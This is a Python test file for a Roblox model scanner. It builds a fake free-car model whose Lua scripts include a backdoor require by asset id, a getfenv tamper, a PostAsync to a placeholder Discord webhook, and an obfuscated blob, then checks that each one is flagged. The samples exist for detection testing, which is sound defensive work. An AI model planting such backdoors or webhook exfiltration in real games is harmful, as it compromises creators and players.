#!/usr/bin/env python3
"""`rhr inspect` (rhr.inspect): what a file holds, and findings for risky script code.

A made-up free model (XML) with a clean script, a backdoor `require(<id>)`, `getfenv`,
a webhook, an obfuscated blob and a virus-named script: each finding is where it
should be, with its line, and the clean code has none. The same model's classes,
scripts and assets are counted; a binary fixture is read too. A file of many top-level
Folders lists SUMMARY_LIMIT roots on stdout (`moreRoots` counts the rest) and all of them
with --all or --out, and --all carries the summary's counts.

    python tests/test_inspect.py
"""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
sys.path[:0] = [str(REPO / "src"), str(REPO / "tests")]

from _models import script  # noqa: E402

failures: list[str] = []


def check(ok: bool, message: str) -> None:
    print(f"  {'ok  ' if ok else 'FAIL'} {message}")
    if not ok:
        failures.append(message)


NL = "\n"
MODEL = f"""<roblox version="4">
<Item class="Model"><Properties><string name="Name">FreeCar</string></Properties>
  <Item class="Part"><Properties><string name="Name">Body</string></Properties>
    {script("Script", "Drive", "local seat = script.Parent" + NL + "print('vroom')")}
    {script("Script", "Weld", "local x = 1" + NL + "local m = require(4812345678)" + NL + "m.run()")}
    {script("Script", "Vaccine", "getfenv(0).game = nil", disabled=True)}
    <Item class="Decal"><Properties><string name="Name">Logo</string><Content name="Texture"><url>rbxassetid://12345678</url></Content></Properties></Item>
  </Item>
  <Item class="MeshPart"><Properties><string name="Name">Wheel</string><Content name="MeshId"><url>rbxassetid://987654321</url></Content></Properties>
    {script("LocalScript", "Stats", 'local h = game:GetService("HttpService")' + NL + 'h:PostAsync("https://discord.com/api/webhooks/1/abc", "x")')}
    {script("ModuleScript", "Lib", "return " + "(\\\\104\\\\101);" * 600)}
  </Item>
</Item>
</roblox>"""


def main() -> int:
    from rhr.budget import SUMMARY_LIMIT
    from rhr.inspect import inspect

    with tempfile.TemporaryDirectory(prefix="rhr-inspect-") as directory:
        path = Path(directory) / "FreeCar.rbxmx"
        path.write_text(MODEL, encoding="utf-8")
        proc = subprocess.run([sys.executable, "-m", "rhr", "inspect", "--all", str(path)], capture_output=True, text=True,
                              encoding="utf-8", timeout=120)
        check(proc.returncode == 0, f"exit code {proc.returncode}: {proc.stderr[-300:]}")
        report = json.loads(proc.stdout)

        # A file of many top-level instances: stdout lists the first SUMMARY_LIMIT roots
        # and counts the rest; --out and --all list every one.
        folders = Path(directory) / "Folders.rbxmx"
        folders.write_text('<roblox version="4">' + "".join(
            f'<Item class="Folder"><Properties><string name="Name">F{i}</string></Properties></Item>'
            for i in range(SUMMARY_LIMIT + 7)) + "</roblox>", encoding="utf-8")
        runs = {}
        for extra in ([], ["--all"], ["--out", str(Path(directory) / "folders.json")]):
            done = subprocess.run([sys.executable, "-m", "rhr", "inspect", str(folders), *extra],
                                  capture_output=True, text=True, encoding="utf-8", timeout=120)
            check(done.returncode == 0, f"inspect {' '.join(extra)} exits 0: {done.stderr[-300:]}")
            text = Path(extra[1]).read_text(encoding="utf-8") if extra[:1] == ["--out"] else done.stdout
            runs[tuple(extra[:1])] = (json.loads(text), done.stderr)
    print("the roots")
    shown, err = runs[()]
    check(len(shown["roots"]) == SUMMARY_LIMIT and shown["moreRoots"] == 7,
          f"stdout: {len(shown['roots'])} roots, moreRoots {shown.get('moreRoots')}")
    check(f"{SUMMARY_LIMIT} of {SUMMARY_LIMIT + 7} roots on stdout" in err, f"the stderr note names the roots: {err!r}")
    for flag in ("--all", "--out"):
        whole, _ = runs[(flag,)]
        check(len(whole["roots"]) == SUMMARY_LIMIT + 7 and whole["moreRoots"] == 0,
              f"{flag}: {len(whole['roots'])} roots, moreRoots {whole.get('moreRoots')}")
    print("inspect --all has the summary's counts")
    for key, value in (("moreFindings", 0), ("moreScripts", 0), ("moreRoots", 0)):
        check(report.get(key) == value, f"{key}: {report.get(key)!r}")
    counted = {}
    for finding in report["findings"]:
        counted[finding["check"]] = counted.get(finding["check"], 0) + 1
    check(report.get("findingCounts") == counted, f"findingCounts: {report.get('findingCounts')}")
    print("the report")
    check(report["schema"] == "rhr.inspect/1" and report["kind"] == "model", f"{report['schema']}, {report['kind']}")
    check(report["classCounts"].get("Script") == 3 and report["classCounts"].get("MeshPart") == 1, str(report["classCounts"]))
    paths = {s["path"]: s for s in report["scripts"]}
    check(set(paths) == {"FreeCar/Body/Drive", "FreeCar/Body/Weld", "FreeCar/Body/Vaccine", "FreeCar/Wheel/Stats",
                         "FreeCar/Wheel/Lib"}, f"scripts: {sorted(paths)}")
    check(paths["FreeCar/Body/Vaccine"]["disabled"] and not paths["FreeCar/Body/Drive"]["disabled"], "disabled is read")
    check(paths["FreeCar/Body/Weld"]["lines"] == 3, f"lines: {paths['FreeCar/Body/Weld']['lines']}")
    check(report["assets"]["images"] == ["12345678"] and report["assets"]["meshes"] == ["987654321"],
          f"assets: {report['assets']}")

    print("the findings")
    found = {(f["check"], f["path"], f["line"]) for f in report["findings"]}
    for expected in [("require-by-id", "FreeCar/Body/Weld", 2), ("fenv", "FreeCar/Body/Vaccine", 1),
                     ("virus-name", "FreeCar/Body/Vaccine", None), ("webhook", "FreeCar/Wheel/Stats", 2),
                     ("obfuscated", "FreeCar/Wheel/Lib", 1)]:
        check(expected in found, f"{expected[0]} at {expected[1]}:{expected[2]}")
    check(not any(f["path"] == "FreeCar/Body/Drive" for f in report["findings"]), "the clean script has no finding")
    check(report["findings"][0]["severity"] == "error", "errors come first")

    print("a binary file")
    binary = inspect(REPO / "tests" / "fixtures" / "highlight.rbxm")
    check(binary["instances"] > 0 and binary["schema"] == "rhr.inspect/1", f"{binary['instances']} instances read")
    if failures:
        print(f"{len(failures)} failure(s)")
        return 1
    print("inspect: ok")
    return 0


def test_main():
    from _harness import run_main

    run_main(main)


if __name__ == "__main__":
    raise SystemExit(main())
